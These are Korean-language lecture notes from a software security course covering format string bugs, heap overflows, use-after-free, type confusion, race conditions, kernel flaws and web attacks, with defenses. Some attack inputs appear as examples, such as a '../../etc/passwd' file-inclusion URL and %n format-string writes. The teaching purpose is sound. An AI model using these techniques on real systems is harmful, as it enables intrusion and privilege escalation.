우리가 format specifier를 계속 제공하기 시작하면 `buf[64]`의 내용까지 가서 출력하기 시작한다. ASCII 코드로 해석하면 `%11x`가 될 것이다.

`10p.`
⚠️ 임의의 주솟값으로의 Memory Disclosure
0x414243이라는 임의의 주솟값을 가지고 memory disclosure을 일으킬 수 있는 것이다.

`11p.`
⚠️ Overwriting Memory, 출력된 Character Byte의 개수를 Store
read만 가능할 뿐, 덮어쓰는 건 못한다.
고 생각했는가?
`%n` specifier를 사용하면 가능하다!
```c
printf("ABCDE12345%n\n", &i); // i = 10
printf("%d%n\n", 100, &j); // j = 3
```

따라서 FSB로 Control Hijack을 하는 Main Idea는 다음과 같다.
>> "몇 번째" 값을 "어떤 값"으로 덮어씌울까?
- "몇 번째": `%s`로 read
- "어떤 값": `%n`로 write

`printf()`의 허술함은 여기서 끝나지 않는다.
```c
printf("%2`$d", 100, 200, 300, 400)  // prints "200"
```
- "몇 번째" 값이 너무 멀리 있을 때 위 예시의 `%11x`를 반복해서 입력하는 게 아니라 바로 불러올 수 있다.  
- ex) arg57 불러오기 -> `%56$`s`  

그럼 한 번 정리해볼까?
#### 🔫 Wrap-up of FSB Attack Scenario
1. %d: register와 stack에 있는 값을 dump 할 수 있다.
2. %s: 
3. %n: 
4. `$: 목표 buffer가 너무 멀리있는 경우 이걸 쓰면 편하다.

<br>

그럼 printf를 저런식으로 공격할 수 있을까?  
한 번 실제 예시를 봐보자 `진짜 있다.`  

<br>

`15p.`  
Format string bug in sudo Program:  
```c
...
sprintf(fmt2, "%s: %s", argv[0], fmt);
fprintf(stderr, fmt2, ...);
```
symbolic link를 통해서 공격이 가능하다.  
쉽게 말하면 linux 바탕화면에 바로가기를 만들고 %n, %n...등을 넣어서 실행했다는 뜻이다.  

<br>

sudo 프로그램은 프로그램 특성상 SUID bit가 들어있기 때문에 결과적으로 root 권한으로 상승 가능한 priviledge exploit가 가능하게 된다.  

<br>

`강의자료 15p. 및 Assigned CVE-2012-0809: `  
누군가 발견한 취약점들 CVE-연도-번호  

<br>

`16, 17p. 수업 못들음`  

<br>

# 7. Heap Vulnerability  

<br>

동적 메모리 할당에 대해서 간단하게 얘기해보자.  
`malloc(), free()`같은 함수를 호출할 때 무슨 일이 일어나는가?  

<br>

mamory allocator가 필요에 따라 heap 영역의 크기를 늘리는 `sbrk()` 시스템 콜을 호출한다.  
Heap Memory Section에는 작은 Memory Block(Chunk)들이 만들어지고 관리된다.  

<br>

**malloc()**  
`malloc()` 함수 내부 코드는 어떤 것을 하냐?  
몇 Byte의 요청이 들어오면 그 크기에 맞는 빈 Block을 찾아서 Return하고 할당  
아직 Allocated되지 않은 Block들은 Free Block이라고 한다.  

<br>

시스템프로그래밍을 상기하자.  
Memory Allocator는 Free Block을 Doubly Linked List 구조로 관리된다.  
알맞은 Size의 Block을 Free Block을 탐색하며 Return하거나  
Free Block의 크기가 더 크거나 하면 Split이 되고 Return될 수도 있다.  
Allocate 전과 후의 차이는 `6p`.와 `7p.`를 보자.  

<br>

**free()**  
그럼 이제 `free(q)`를 호출하면 어떻게 될까?  
단순히 Allocated Block이 Free가 되며 Free Block Doubly Linked List에 추가된다.  
어떻게 추가될지는 정책에 따라 다르다.  

<br>

**Metadata**  
그럼 Metadata가 포함된 Block의 구조를 생각해보자.  
Block을 가리키는 Pointer가 실질적으로 Block의 맨 앞을 가리키는 게 아니다.  
동적 메모리 할당을 위한 Block의 정보를 또 저장해야되기 때문이다.  
그 내용은 Allocated된 Block과 Deallocated된 블록이 서로 다르다. `10p.`  
이 역시 시스템프로그래밍을 상기하자.  

<br>

이제 이를 바탕으로 Heap의 BOF와 Use-After-Free를 배워보자.  

<br>

## 7.1 BOF in Heap  

<br>

Heap에서 역시 Stack과 비슷한 이유로 BOF가 일어난다.  
- 안전하지 않은 lib 함수들을 불러오거나  
- 배열의 임의의 index에 접근하거나  

<br>

`malloc()`을 쓴다는 것은 기본적으로 사용자 입력으로 주어진 값을 고려하겠다는 것이다.  
다음 코드를 보자.  
```c
uint item_count = read_uint(); 
int *arr = (int*) malloc(item_count * 4); // intis 4-byte
if (arr == NULL)
	return;
uint idx = read_uint();
if (idx < item_count)
	arr[idx] = 1;
```
얼핏보면 안전해보일 것이다.  
item_count라는 값이 0x4라는 값으로 wrap-around되게 된다.  
그렇게 되면 `idx` 값으로 어떤 값을 줘도 배열의 크기보단 작으니까 접근 가능하게된다. `Integer Overflow`  

<br>

🔫 그럼 Heap에서의 BOF는 어떻게 악용 가능할까?  
일단 Heap 영역에는 Saved Return Address는 없다는 것을 상기하고 가자.  
1. Heap에 할당되어있는 구조체의 내용을 수정하여 공격할 수 있다. `Control Hijack`  
2. Medata 부분을 조작하여 문제를 일으킬 수 있다.  

<br>

그럼 위 사례의 첫 번째 경우에 대해서 자세히 말해보자.  
**1. Corruption of Sturcture/Object**  
```c
structS {
	charbuf[16];
	void(*handler)(char *s);
};

void f(void) {
	struct S *s = malloc(sizeof(struct S));
	gets(s->buf); // Buffer overflow (may corrupt "handler")
	s->handler("input msg");
}
```
이렇게 handler를 Overwrite하게 되면 사실상 오염시킨 대상 (return address -> 구조체) 빼곤 똑같은 공격이 가능하게 된다.  

<br>

Virtual table: 비단 C 뿐만이 아니라 C++의 객체도 위와 같이 Overwrite되면 위험한 것들이 많다.  

<br>

**2. Corruption of Metadata**  
일단 Next와 Prev만 집중적으로 보자  
그렇다면 어떤 공격이 일어나게 될까?  
Free Block 연산 시 위험한 Memory 연산이 일어나게 된다.  
```c
// Assume Next or Prev Corrupted!
remove_from_list(b) {  // Allocate 시 알맞은 Block을 찾았을 때
	Block *n = b->next;
	Block *p = b->prev;
	n->prev = p;
	p->next = n;
}
```
이렇게 되면 `n`또는 `p`를 해커가 지정한 임의의 주소로 덮어쓸 수 있게 되면서  
공격자 입장에서는 임의의 주솟 값을 자신이 의도한 임의의 주솟값으로 덮어쓸 수 있게된다.  

<br>

그래서 요즘 Memory Allocator들은 안전빵을 넣어놓는다.  
```c
#define unlink(P, BK, FD) {  // 앞의 remove_from_list(b)와 같은 역할
	FD = P->fd;
	BK = P->bk ;
	if (FD->bk != P || BK->fd!= P) error(); // Validation
	else {
		FD->bk = BK;
		BK->fd= FD;
	}
}
```
정상적인 상황이라면 나의 다음 Node로 갔다가 다시 돌아왔을 때 나 자신으로 돌아와야한다는 것을 이용해 검증 Logic이 추가되었다.  
하지만 이것도 우회하는 것이 가능하긴 하다.  

<br>

## 7.2 Use-After-free (UAF)  

<br>

말 그대로 이미 `free()`로 deallocated된 Heap 공간에 접근하는 것  
다른 옛날 이름으론 dangling pointer라고도 한다.  

<br>

다소 멍청한 코드일지도 모르지만 예를 들기위해 일단 봐보자.  
```c
struct S {
	int x;
	...
};
struct S *s = (struct S*) malloc(sizeof(struct S));
...
free(s);
...
printf("x = %d\n", s->x); // Accessing deallocated memory
```
그럼 무엇이 읽혀나올까?  
쉽게 얘기하면 예측할 수 없다.  

<br>

그럼 좀 더 그럴싸한 예제 두 개를 보자.  
```c
struct S *s1 = (struct S*) malloc(sizeof(struct S));
struct S *s2 = s1;
px = &(s1->x);
...
free(s1); // OK, let’s not use 's1' anymore
... // But forgot about 's2' or 'px'
s2->x = 100;
printf("x = %d\n", *px);
```
쉽게 말하면 `아 맞다 free한 거 까먹었다..` 라는 상황이다.  

<br>

```c
struct S* items[32]; // Each element is a pointer to struct

void delete(intidx) {
	if(idx< 0 || idx>= 32)
		return;
	if (items[idx] != NULL) {
		free(items[idx]);
	}
	// Didn’t we forget something here?
}
```
쉽게 말하면 `어라 누굴 free 했었지..?` 라는 상황이다.  
어떤 idx를 free했는지 기록할 필요가 있을 것이다.  

<br>

`25-27p. 놓침`  

<br>

그럼 이 취약점을 어떻게 이용해서 control hijack을 일으킬 수 있는걸까?  

<br>

#### 🔫 Exploiting Use-After-Free  

<br>

다음 코드를 살펴보며 어떻게 공격이 진행되는 건지 알아보자.  
```c
struct Data *p = (struct Data*) malloc(sizeof(struct Data));
...
free(p);
...
len = read_size_t();
char *str = (char *) malloc(len); // Will read in string
..
p->handler(p->buf); // Use-after-free Heap memory block
```

<br>

`len` 값을 잘 조정해서   
`str`과 `p`가 같은 곳을 가리키고 있는 상황을 억지로 만들어낼 수 있는 것이다.  
`p`가 가리키고 있는 곳이 다시 allocated된 block이 되는 것이다.  
그리고 만약 `str`이 user input string이면   

<br>

`+)` Stack에서의 User-After-Free  
그리고 Stack에서도 User-After-Free가 일어날 수 있긴 하다.  
물론 stack에선 malloc은 없지만 만약 지역 변수의 pointer를 반환하려고 하는 경우는 생각해보면 UAF와 비슷하다. 지역 변수는 함수가 종료되면 자동으로 deallocated 되기 때문이다.  

<br>

`+)` Uninitialized Data/Variable Use  
UAF는 이제 더이상 사용하면 안되는 메모리에 접근하는 것으로 생각할 수 있다.  
그와 반대로 아직 사용하면 안되는 메모리에 접근하는 경우도 생각해볼 수 있다.  
이와 같은 것이 Uninitialized Data/Variable Use인데 이것 역시 많은 문제를 일으킬 수 있다.  
```c
void f(void) {
	struct S s;
	read(0, s.buf, 32); // Using uninitialized pointer value
}
```

<br>

# 8. Type Confusion and Race Condition  

<br>

남은 Expoit방법 짜투리 두 개  

<br>

## 8.1 Type Confusion  

<br>

서로 다른 구조체를 가리키고 있는 포인터 p1, p2가 있다.  
그런데 우리가 그림처럼 p2를 p1을 가리키게 하면 어떻게 될까?  
`char* ID` -> `int n`, `void *handler(void)` -> `char[buf]`, `int data[8]` -> ??? 가 될것이다.  

<br>

우선 다음으로 넘어가기 전, C에서의 Type Casting을 복습해보자.  
C에서는 inherit의 개념이 없기 때문에 C에서는 Type Casting을 통해 이를 구현하고자 한다.  

<br>

```c
struct packet {
	int kind;
};

//packet.kind == 1
struct packet_A {
	int kind;
	char header[4];
	int data[8];
};

// packet.kind == 2
struct packet_B {
	int kind;
	char header[8];
	uint32_t len;
	...
};

// Type Casting을 통한 상속 야매 구현
void f(struct packet *p) {
	if(p->kind == 1) {
		struct packet_A *pa = (struct packet_A*) p;
		// Process as packet_A type
		...
	}
	else (p->kind == 2) {
		struct packet_B *pb = (struct packet_B*) p;
		// Process as packet_B type
		...
	}
};
```

<br>

그런데 상속이 구현된 C++이라고 Type Casting을 안 쓸수 있는 건 아니다.  
여전히 어쩔 수 없이 써야하는 부분이 존재한다.  

<br>

```cpp
class Packet { ... };

class PacketA: Packet { ... };
class PacketB: Packet { ... };
```

<br>

Down Casting: `부모 구조체` -> `자식 구조체`  
Up Casting: `자식 구조체` -> `부모 구조체`  

<br>

Up Casting은 그나마 안전하지만, Down Casting은 위험할 수 있다.  
하지만 Down Casting을 안 쓸수는 없는 노릇, 우리는 `static_cast`를 통해 Down Casting을 할 수 있으나, 아무런 검사도 하지 않고 Type Casting을 시켜버리는 것이기 때문에 PacketA의 부모가 Packet이라는 확신이 있을 때만 쓰자.  
```cpp
PacketA *pa = static_cast<PacketA*>(p);
```

<br>

검사를 안 방법이 있으면, 반면에 검사를 하는 방법도 있다. 이는 `dynamic_cast`를 통해 Down Casting을 하면된다. 우리는 좀 더 안전하게 Type Casting을 할 수 있을 것이다.  
```cpp
PacketA *pa =  dynamic_cast<PacketA*>(p);
```

<br>

그렇다면 여기서 만약에, `static_cast`를 확신이 없을 때, 즉 함부로 잘못 사용하면 어떻게 될까? 자칫하면 `4p.`와 같은 일이 벌어질 수 있다.  

<br>

실제로 다음과 같은 Type Confusion Error가 있었다.  
```cpp
SVGElement* SVGViewSpec::viewTarget() {
	if (!m_contextElement)
		return 0;
	return static_cast<SVGEElement*>( // static_cast -> dynamic_cast << safe!!
		m_contextElement -> treeScope() -> getElementById(
			m_viewTargetString
		)
	);
}
```

<br>

따라서 Type Confusion은 개발자 자체의 실수`Logical Error`로도 일어날 수도 있고,  
BOF를 통해서도 일어날 수 있다.  

<br>

이정도로 해서 Type Confusion의 얘기는 끝내자.  

<br>

## 8.2 Race Condition  

<br>

일단 Race Condition을 위한 배경지식을 알아보자.  

<br>

지금까지는 Control Flow가 하나만 있다고 가정하고 Exploit 시뮬레이션을 돌려왔었다.  
하지만 현실세계의 코딩은 그렇게 간단하지 않다. 당장 운영체제에서 배우고 있지 않은가?  

<br>

/ Multiple Execution Flow  
Process: 실행중인 Program의 Instance  
Thread: Process 안에서 실행 중인 더 작은 Control Flow Unit  

<br>

코어가 하나 있다고 가정할때, 우리가 의식하지 못하는 순간에도 Context Switch가 일어나며 프로그램이 실행되고 있다.  

<br>

<img src="Docs/Pasted image 20241107125852.png" width="300">
 <img src="Docs/Pasted image 20241107125923.png" width="300">
  
Process State = registers + Memory + $`\alpha`$  
- 각각의 Process는 별개의 Memory Space를 가지고 있다.  
- 각각의 Thread는 별개의 Logical Control Flow와 Stack Area를 가지고 있다.  

<br>

#### Race Condition  
> Broad Meaning: 스케줄링 양상에 따라서 프로그램의 실행 결과가 달라질 수 있는 것  
> `어떨 때는 출력값 99, 어떨 때는 100, 어떨 때는 101을 내놓는 현상`  
> In Security:   

<br>

/ Time-of-Check to Time-of-Use (TOCTOU)  
Race Condition으로 인해서 나타날 수 있는 취약점  
- Time-of-Check: 프로그램의 어떤 것을 사용하거나 하기에 안전한지 체크하는 것  
- Time-of-Use:   
문제는 Check를 통과한 Reaource가 Unsafe 하게 바뀔 수도 있고,..  

<br>

예제를 보며 이에 대해 살펴보자.  

<br>

**Race Condition Example**  
(1) Root Previlege로 실행되는 Program  
```c
// Pseudo-code of program P
if ("/tmp/my_temp" already exists) {
	exit(1);
}
else {
	Open "/tmp/my_temp" and write some data threr
}
```
!) 2번째 줄과 6번째 줄의 미묘한 간격을 노리고 Attacker가 다음과 같이 공격하게 된다.  
<img src="Docs/Pasted image 20241112123024.png" width="600">
  
- `/tmp/my_tmep`라는 파일의 바로가기 `/etc/passwd`가 생성됨  
- 저 바로 가기를 타고가서 `/etc/passwd`라는 파일을 write하게 된다.  
- 이 `/etc/paswd`라는 파일에 Root Privilege 성격의 프로그램을 통해 exploit할 수 있게 되는 것이다.  

<br>

(2) 강제 송금  
```c
void transfer(int sender_id, int receiver_id, int amount) {
	if (amount < 0) return;
	if (balance[sender_id] < amount) return;
	...// Update receiver's balance accordingly
	balance[sender_id] -= amount;
}
```
!) 여태 배운 것 `amount < 0, BOF`말고 Race Condition에서 다음과 같이 공격하게 된다.  
<img src="Docs/Pasted image 20241112123427.png" width="600">
  
- Line3까진 무사히 실행이 되었다고 가정하자.  
- receiver 입장에서 두 번 돈을 받게 되고 sender입장에서 강제로 두 번 돈을 보내게 된다.  
- 예를들면 1000원을 한 번 보내고 내 통장이 0원이 되어도 이미 Line3에서 보내도 된다는 허락이 떨어졌기 때문에 강제로 돈이 한 번 더 보내져서 -1000원이 되는 것이다.  

<br>

#### 🛡️ Mutex  
> 위와 같은 문제들은 Mutex로 어느정도 예방이 가능하다. `완전한 해결책은 아님`  
<img src="Docs/Pasted image 20241112124104.png" width="600">
  

<br>

그럼 다 Mutex로 예방하면 되지 왜 아직도 위와 같은 문제들이 남아있냐 하면 Mutex가 완전한 해결책은 아니기 때문이다.   
- Performance Overhead도 일어날 수도 있고,  
- DeadLock이라는 심각한 문제도 발생할 수 있다. 예를 들면 Signal Handler에서 Mutex를 잡으면 Deadlock이 발생할 수 있다. `위의 그림`  

<br>

이 개념에 대해서 완전히 이해할 필요는 없고 Mutex가 완전한 해결책이 아니라는 점만 상기하고 넘어가자.  

<br>

# 9. Kernel Security  

<br>

이제 시스템프로그래밍을 들었고, 운영체제를 배우는 우리에게 익숙한 코드에 대한 보안취약점에 대해서 이야기해보자.  

<br>

전에는 User Code에서 일어나는 코드의 보안 취약점에 대해서만 이야기 해왔다.  
그럼 이제 Kernel Code로도 들어가보자는 것이다.  

<br>

Kernel Code란 무엇이냐?  
좀더 높은 권한을 가지고 있으며, OS의 핵심 부분이다.  

<br>

System Call에 대해서도 복습하자.  
Code로 Register를 잘 세팅하고 권한이 높은 Kernel의 Function을 부르는 것으로 생각하면된다.  

<br>

<img src="Docs/Pasted image 20241112125707.png" width="600">
  
⚫: User Level에서는 무슨 짓을 해도 접근할 수 없다.  
🔴: Syscall을 호출하면 왼쪽과 같이 접근 가능하도록 바뀐다.  
Syscall을 호출하는 순간 %rip(Program Counter)의 위치가 왼쪽과 같이 Kernel Code를 가리키게 되고, Syscall을 처리하기 위한 여러가지 Inst들이 실행되게된다.  

<br>

이제 System Call Handler가 등장할 차례이다.  
우리가 Pintos에서 짰던 `syscall.c`를 상기하자.  
- Memory Check를 시행하고  
- Stack에서 올바른 Argument를 잘 전달하고  
- Kernel Code를 실행한다.  
이를 위해 System Call Handler는 위 그림에서 0-4GB까지의 영역에 모두 접근할 수 있다.   

<br>

## 9.1   

<br>

우리가 여태 배웠던 BOF와 같은 공격이 Kernel Code에서도 일어날 수 있다. `strcpy()`  
따라서 보안을 위한 철칙 한가지가 있다.  
> Kernel must not Trust User-Provided arguments.  

<br>

그런데 Kernel Code에서만 일어날 수 있는 취약점도 존재한다.  
이에 대해서 알아보자.  

<br>

#### Using User-Provided Pointer without Check  
```c
read_handler(int fd, void *buf, size_t n) { 
	.. // Read in the file content
	memcpy(buf, file_content, n);
	return 0; 
}
```
여기서 buf는 User-Provided Pointer이다.  
!) 그 buf를 User Space가 아닌 Kernel Space를 가리키는 Pointe로 설정하면 어떻게 될까?  
- 공격자가 Kernel Memory를 덮어쓸 수 있게된다.  

<br>

이 부분은 배웠을 것이다. 따라서 기억이 나야 하는데 기억이 안난다면 PintOS Manual 3.1.5이 내용을 보면서 다시 복습하자. `11p.`  

<br>

다음은 Real-World에서의 예시이다.  
```c
// arg 포인터에 대한 검사도 진행되어야 한다.
...
SyscallHandler(struct Str* arg) {
	wchar_t *buf = arg->buf;
	ushort len = arg->len; // wchar_t는 2byte이므로 이는 항상 짝수
	if (len & 1) {
		LogError(...);     // 그래서 웬만해선 이곳에 진입하지 않는다.
	}
	else if (IsKernelSpace(buf)) { // Why "else-if"?
		return;
	}
	... // Access 'buf' here.
}
```
왜 else가 아니라 else-if라고 하는걸까?  
LogError는 return하는 게 아니라 정정 후 process를 계속 진행하기 위한 함수이다.  
따라서 LogError 후에도 IsKernelSpace를 건너뛰지 않도록 else if를 쓰는 것이다.  

<br>

#### Double Fetch  

<br>


<br>

다음 코드에서의 취약점을 한 번 봐보자.  
```c
SyscallHandler(structStr* arg) {
	charkbuf[128];
	if (IsKernelSpace(arg->buf) || arg->len >= 128) { 
		return;
	}
	memcpy(kbuf, arg->buf, arg->len); 
	..
```

<br>

!) 만약 t1에서 통과한 왼쪽의 값을 t2에서 오른쪽과 같이 바꿔놓으면 한 번 더 fetch를 해서 TOCTOU문제를 일으킬 수 있게된다.  
<img src="Docs/Pasted image 20241114123021.png" width="250">
 <img src="Docs/Pasted image 20241114123041.png" width="350">
  

<br>

🛡️ 위 문제를 다음과 같이 방지할 수 있다.  
```c
SyscallHandler(structStr* arg) {
	charkbuf[128];
	char *buf = arg->buf; // Copy arguments to local variable
	intlen= arg->len;
	if (IsKernelSpace(arg->buf) || arg->len >= 128) { 
		return;
	}
	memcpy(kbuf, arg->buf, arg->len); 
	..
```
Local Variable, 즉 Stack은 Thread마다 따로인 값이기 때문에 두 번 fetch(Double Fetch)를 해서 위와 같은 문제가 일어날 위험이 없다.  

<br>

#### Null Dereference  

<br>

/ In User Code  
User Code에서 NULL pointer를 사용하면 Denial-of-service Attack은 가능하지만,  
Memory Disclosure 같은 공격은 불가능하다.  

<br>

/ In Kernel Code  
하지만 NULL Defferece가 Kernel에서 일어난다면 문제는 심각해진다.  

<br>

```c
int x, *p = NULL;
if(...) {
	p = &x;
}
*p = secret_key;// What if p is NULL?
...
fptr_table[i](100); // What if fptr_table[i]is NULL?
```
!1) `p`가 NULL pointer인 상태로 5번째 줄에 도달하거나,  
!2) `fptr_table[i]`(함수포인터)가 잘못돼서 NULL Pointer이거나  

<br>

User Code면 그냥 Seg Fault만 뜨고 Program이 다운된다. `메데타시 메데타시`  
하지만 Kernel Code라면 요상한 일이 일어난다.  

<br>

<img src="Docs/Pasted image 20241114124101.png" width="600">
  
다음과 같이 NULL(Address 0)은 User 영역에 존재한다.  
- 따라서 Memory Allocate가 가능하게 되는데, `malloc()`으로는 할 수 없고 `mmap()`이라는 좀 더 low level 함수를 사용하면 가능하다. `!1)`  
- 더 심각하게는 함수포인터 `fptr_table[i]`로 0번지에 할당한 메모리를 이용하여 shell code같은 것을 실행시킬 수 있다. `Priviledge Escalation`, `!2)`  

<br>

🛡️ 따라서 사람들은 다음과 같이 방어를 했다.  
- SW Level:  
- 주소 0에 Memory Allocation 금지  
- `mmap_min_addr`라는 Prarameter로 User가 이 밑으론 Memory Allocation을 하지 못하도록 한다.  
- HW Level:  
- SMEP(Supervisor Mode Execution Prevention): Kernel Mode의 CPU가 User영역의 Code를 실행시키는 것을 막는다.  
- SMAP(Supervisor Mode Access Prevention): Kernel Mode의 CPU가 User영역의 Data에 접근하는 것을 막는다.  
- 근데 항상 막으면 안 되고, System Call Handler가 User영역의 Data를 Fetch해와야 할때는 SMAP를 Disable한다.  

<br>

`21p.` 의 교훈들을 가볍게 살짝 보자.  

<br>

다음은 부록에 해당하는 내용으로, Kernel에서 추가로 일어날 수 있는 하나의 취약점이다.  
`시험 범위에는 해당되지 않는다.`  

<br>

#### Memory Disclosure due to Alignment  

<br>

```c
structTime {
	intsecond;
	longnano_sec;
};

gettime_handler(structTime *arg) {
	struct Time t;
	if (is_kernel_space(arg)) {
		return;
	}
	// Set each field of the local struct
	t.second= ...;
	t.nano_sec= ...;
	memcpy(arg, &t, sizeof(struct time));
}
```

<br>


<br>

# 10. Web Security  

<br>

World Wide Web을 우리는 오늘날 정말 많이 사용한다.  
이에 따라 이곳에서의 보안도 중요해지는데, 이 챕터에서 바로 이에 대해서 이야기 할 것이다.  
아마도 마지막 챕터가 될 것이다.  

<br>

본격적으로 들어가기 전에 당부할 것이 있다.  
본 강의에서 배우는 Expoit 방법들을 실제 세계의 Web에서 절대 실험해보지 않길 바란다.  
~~빨간 줄 그이고 싶지 않으면~~  

<br>

그럼 어떻게 실습을 하지? 라는 의문이 들 수도 있는데,  
실습 과제는 제공되지는 않을 것이고, 다음 사이트에서 사용자 설정을 한 수 원한다면 실습을 진행하면 된다.  
[digininja/DVWA: Damn Vulnerable Web Application (DVWA)](https://github.com/digininja/DVWA)  

<br>

## 10.1 Background on the Web  

<br>

#### Base Concepts  

<br>

/ **URL(Uniform Reqource Locator)**  
```
https://cs.sogang.ac.kr/cs/cs0_5.html?bbsConfigFK=1905
(Protocol://Host name/Path(of document?Query)
```
- Protocol: 규약  
- Host name: DNS서버에서 처리  
- Path: 어떤 파일을 요청하는지에 대한 명시  
- Query: Client가 Web Server에 보내는 추가 요청 `data`  

<br>

/ **HTTP(S)**  
> Web Server와 Client간의 Request와 Responce의 프로토콜. `이런이런 형식으로 주고 받아야된다~ 이런 것이다.`  
- HTTP(S): 안전하게 암호화된 프로토콜로, 도청이 불가능해진다.  
- Example `9p.`  

<br>

/ **HTML**  
> Web Page의 Markup 언어  
- 이를 프로그래밍 언어라고 부르면 곤란하게 생각하는 개발자들이 있다.  
- Markup Tags `<body>, <img>, <p>`  
- Hyperlink: 다른 Page로 리다이렉트  

<br>

/ **JavaScript**  
> Web Page에서 더 Dynamic한 상호작용을 할 수 있도록 한다.  
- HTML과 JavaScript를 적절히 잘 섞으씀으로써 오늘날의 다양한 웹페이지들을 만들 수 있다.  

<br>

/ **Cookie**  
> Web Server가 사용자에 대한 이전의 정보를 기억할 수 있게 하는 것  
- HTTP Protocol은 상호작용이 끝나면 Connection이 사라지기 때문에, Web Server에 Cookie라는 작은 조각을 넣어놔서 이걸로 사용자를 Identify한다.  
- 로그인 해놨던 사이트를 다시 들어가니 로그아웃 되어있는 경우는 바로 Client가 일정시간이 지나면 Cookie를 Expire 시켜버려서 사용자 정보가 사라져서 그런 것이다.  

<br>

#### Server-side code and Backend Database  

<br>

이제 본격적으로 들어가기 전에, Server-Side Code라는 용어에 대해서 살펴보자.  

<br>

/ **Server-Side Code**  
Static Website: 웹페이지의 내용이 고정되어 있는 것  
Dynamic Website: 웹페이지의 내용이 동적으로 변하는것, Web Server에서 뭔가 코드가 계속 돌아가고 있다는 것이다. Web Application이라고 하기도 한다.  

<br>

이 Web Server 쪽에서 돌아가고 있는 모종의 코드를 Server-Side Code라고 하며, 이는 다양한 언어로 작성될 수 있다.  
- PHP, Python(Django), Java(Spring), Ruby (Ruby on Rails), JavaScript (node.js)  
우리는 이 중에서 PHP Language의 취약점에 대해서 자세히 얘기할 것이다. `그렇다고 PHP 언어에 국한될 필요는 없고, 옛날 언어라 취약점이 많아 이를 이용하는 것 뿐이다.`  

<br>

/ **PHP**  
Client가 Request를 보내면 Web Server는 다음과 같은 Server-Side PHP Code를 실행하고, 다음 코드의 수행 결과를 Response에 담아 Client에 보내게 된다.  
```php
<?php
echo "<html>Hi</html>"
?>
```

<br>

그럼 Web Server는 필요한 정보들을 어디에 저장해놓을까?  
바로 Database에 저장해놓는다.  

<br>

/ **Database**  
DB는 Server쪽에서 다음과 같은 정보들을 저장하고 있다.  
- 포스트, 댓글 등  
- ID, Password, 로그인 정보 등  
Server-Side Code에서 Data를 요청하는 Query를 보내면 DB가 Data를 다시 Server--Side Code로 보내게 되는 것이다.  

<br>

그럼이제 본격적으로 취약점을 알아보기 전에 Threat Model을 살펴보며 전체적인 공격 양상을 알아보자.  

<br>


<br>

Threat Model (1)  
<img src="Docs/Pasted image 20241121124348.png" width="450">
  
선량한 Web Server에 악의적인 Attacker User가 공격하는 상황  

<br>

Threat Model (2)   
<img src="Docs/Pasted image 20241121124409.png" width="450">
  
선량한 User가 악의적인 Attacker의 Web Server에 접속하는 상황  
Response를 Attacker가 직접적으로 조작할 수 있다.  

<br>

Threat Model (3)  
<img src="Docs/Pasted image 20241121124423.png" width="450">
  
악의적인 사람이 URL링크를 보내서 선량한 User가 Web Server에 접속하면 위험에 노출되게 되는 상황 `삼자대면`  

<br>

Threat Model (4)  
<img src="Docs/Pasted image 20241121124435.png" width="450">
  
(3)같은 상황에서 Attacker가 자신만의 Web Server를 또 추가적으로 운영하고 있는 상황  

<br>

## 10.2 Various Vulnerability and Attacks in the Web  

<br>

그럼이제 본격적으로 취약점들에 대해서 알아보자.  

<br>

#### ⚠️ File Inclusion Vulneribility `Thread Model (1)`  

<br>

Server-Side Code에서, 다음과 같이 하나의 Code File이 다른 File을 Include할 수 있다.  
```php
 <?php
	 include 'intro.php'; // 환영 문구 띄우기
	 include 'menu.php';  // 메뉴 띄우기
	 ...
 ?>
```
가독성을 위해 Module화를 하며 File들을 기능별로 분리한 뒤에 그 File들을 각각 가져다 쓰는 것이다.  

<br>

그럼 이제 취약점을 알아볼까?  

<br>

어떤 Web Site의 페이지의 `JOIN` 버튼을 누르면 다음과 같은 `php` File이 실행되어 `feature`에 해당하는 내용을 불러오게 된다고 하자.  
```php
<?php
 include $`_GET['feature'];
 ?>
 // ``$_GET[ ]`: 위에서 한 URL내용 중 '?'의 뒷부분에 해당하는 내용을 전달하는 것
 // 위에서 include는 C 언어에서의 그것과 같은 기능을 하는 것이라고 생각해도 된다.
```

<br>

feature에 해당하는 내용은 위의 URL에서 배운 것처럼 '?'뒤에 다음과 같이 붙어있다.  
```URL
www.target.com/a.php?feature=join.php
```

<br>

그렇다면 URL 내용을 Attacker가 다음과 같이 잘 조작해서 다음과 같이 수정하면 어떻게 될까?  
```URL
www.target.com/a.php?feature=../../../../etc/passwd
```
우리는 이제 웹페이지를 입력하는 창에 위와 같은 내용을 집어넣는것 만드로도 비밀번호를 읽어올 수 있게 되는 것이다.  

<br>

🛡️ Prevecting File Inclusion Attack  
- 간단하게 문자열 패턴 검사를 한다. `'../' 없애기`  
- `$`_GET['feature']`에 해당하는 내용을 특정한 것만 불러올 수 있도록 Allowed List를 만든다.  
근데 그냥 File Inclusion 기능을 없애버리기도 한다.

#### ⚠️ File upload Vulnerability

우리가 게시판에 첨부 파일을 올렸다고 하자.
그렇다면 그 첨부 파일은 Web Server의 특정 디렉토리에 저장될 것이다.
보통 DB에 넣기보단 Linux(Web Server)의 File System에 저장된다.

`files/A.pdf`라는 파일과 연결되는 Link가 우리의 게시글과 함꼐 저장되게 된다.

그럼 Attacker는 이를 어떻게 공격할까?

🔫
공격자가 `A.pdf`가 아니라 PHP 확장자를 가지는 공격 코드 `A.php`를 보내면, Web Server에서 이를 실제로 실행해야 할 코드로 인식하게 되고 해당 파일을 Attacker가 접근 할 시 악성 코드를 실행하게 된다.

🛡️
막는 방법은 간단하다.
- `.php` 확장자의 파일은 안 받으면 된다. `.pht`라는 확장자도 안된다. 이도 역시 실행해야 할 PHP 코드로 인식하기 때문이다. `이거 말고도 몇 개 더 있다.`
- 또는 `<?php`라는 태그를 포함한 파일을 안 받을 수도 있다. 하지만 이렇게 일일이 deny-list를 작성하는 것이 위험한 이유는, 우리가 모든 경우를 막을 수 없기 때문이다. 예를 들어, `<?php`가 아니라 `<?`만 작성해도 PHP로 인식된다.
- 따라서 좀 더 안전하고 범용적인 방어 방법은 업로드할 Directory를 Non-Executable하게 하는 것이다.

#### ⚠️ SQL injection Vulnerability

먼저 시작하기 전에 간단한 배경지식을 알고 가자.

/ **GET vs POST**

GET
```php
GET /login.php?id=jason&pw=asdf HTTP/1.1
Host: abc.com
...
```

POST
```php
POST /login.php HTTP/1.1
Host: abc.com
...
(Body) id=jason&pw=asdf
```

GET보다는 POST가 조금 더 안전하다.
POST와 비교되는 GET에서의 취약점이 뭔지 한 번 간단하게 말해보자면,
만약에 Browser History가 남아있는 상황에서 GET으로 Login을 하면 URL을 저장해놓는 Browser History에 내가 쓴 아이디랑 패스워드들이 남아있을 수도 있다.

